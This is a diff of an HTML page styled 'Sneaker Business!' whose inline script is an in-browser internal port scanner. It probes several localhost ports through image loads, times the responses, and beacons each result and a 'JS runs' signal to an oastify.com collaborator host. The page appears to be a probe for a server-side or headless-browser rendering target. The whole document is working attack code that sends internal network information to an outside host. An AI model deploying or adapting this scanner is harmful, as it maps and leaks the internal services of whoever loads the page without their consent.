@@ -8,15 +8,21 @@
     <h1>Sneaker Business!</h1>
     <script>
         const COLLAB = 'w304c6kvputj973pwmh2pb8aw12sqje8.oastify.com';
-        const PORTS = [22, 80, 443, 3306, 8080];
         
-        PORTS.forEach(port => {
+        // Confirm JS runs first
+        new Image().src = `http://scan-start.${COLLAB}/x`;
+        
+        // Simple port scan using Image (more reliable than fetch)
+        [80, 443, 8080, 22, 3306].forEach(port => {
+            const img = new Image();
             const start = Date.now();
-            fetch(`http://127.0.0.1:${port}/`, { mode: 'no-cors' })
-                .finally(() => {
-                    const ms = Date.now() - start;
-                    new Image().src = `http://port${port}-${ms}ms.${COLLAB}/x`;
-                });
+            
+            img.onload = img.onerror = function() {
+                const ms = Date.now() - start;
+                new Image().src = `http://p${port}-${ms}.${COLLAB}/x`;
+            };
+            
+            img.src = `http://127.0.0.1:${port}/favicon.ico?t=${Date.now()}`;
         });
     </script>
 </body>
